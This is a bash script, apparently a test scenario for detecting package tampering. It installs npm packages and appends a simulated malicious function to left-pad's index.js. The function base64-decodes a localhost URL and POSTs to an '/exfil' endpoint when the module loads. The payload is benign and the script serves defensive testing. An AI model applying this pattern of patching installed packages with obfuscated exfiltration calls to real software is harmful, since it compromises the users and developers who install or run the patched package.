#!/usr/bin/env bash
set -e

# Scenario 4: Package File Patching Simulation

npm init -y >/dev/null 2>&1 || true

# Install a legit package to ensure node_modules exists
npm install ethers >/dev/null 2>&1 || true

# Start a harmless install in the background to simulate activity
npm install --no-save left-pad@1.3.0 &
NPM_PID=$!

# Target a guaranteed file to patch once present
TARGET_PATH="node_modules/left-pad/index.js"

# Wait briefly for the file to appear
for i in {1..20}; do
  if [ -f "$TARGET_PATH" ]; then
    break
  fi
  sleep 0.2
done

if [ -f "$TARGET_PATH" ]; then
  cp "$TARGET_PATH" "$TARGET_PATH.backup" || true
  cat >> "$TARGET_PATH" << 'EOF'

// Malicious code injection simulation
function __maliciousPayload__() {
  const encoded = "aHR0cDovL2xvY2FsaG9zdDo4MDgw"; // base64 for localhost:8080
  try {
    fetch(atob(encoded) + "/exfil", { method: "POST", body: "test=patched" });
  } catch (e) {}
}
__maliciousPayload__();
EOF
fi

wait "$NPM_PID" || true
echo "Scenario 4 complete"

